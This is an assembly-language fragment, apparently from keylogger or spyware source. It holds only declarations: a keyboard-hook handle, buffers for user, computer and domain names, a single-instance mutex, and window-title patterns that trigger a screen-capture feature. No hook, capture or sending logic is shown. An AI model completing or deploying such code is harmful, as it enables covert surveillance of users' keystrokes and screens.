;-----------------------------------------------------------------------
include includes.inc

;-----------------------------------------------------------------------
_CaptureScreen PROTO    :dword

;-----------------------------------------------------------------------
ADD_CAPTURE_SCREEN_FEATURE  equ TRUE

;-----------------------------------------------------------------------
.data
    hBuffer         dd ?
    hUserName       db 32 dup(0)
    hComputerName   db 32 dup(0)
    hCurrentWindow  dd 0
    hDateFormat     db "MM/dd/yyyy ", 0
    hDateFormat_FN     db "MM-dd-yyyy_", 0
    hDomainName     db 128 dup(0) 
    hCurrentThreadPiD   dd 0

    hFile       dd 0
    hHook       dd 0
    hModule     MODULEENTRY32 <>
    
    hSnapShot   dd 0
    hTimeFormat db "hh:mm:ss tt", 0
    hTimeFormat_FN  db "hh-mm-ss_tt",0
    
    msg         MSG <>
    szMutex     db "Global\Failure0",0
    
    IF ADD_CAPTURE_SCREEN_FEATURE
    szPattern   db "Visor ",0
                db "Viewer",0
                db "Messen",0
                db " Paint",0
                db ".jpg  ",0
                dd  -1
    lpTimeBuf_FN    db  20 dup(0)
    szFileNameBuf   db  41 dup(0)
    ENDIF

;-----------------------------------------------------------------------
pushz macro szText:VARARG
    local nexti
    call nexti
    db szText,00h
    nexti:
endm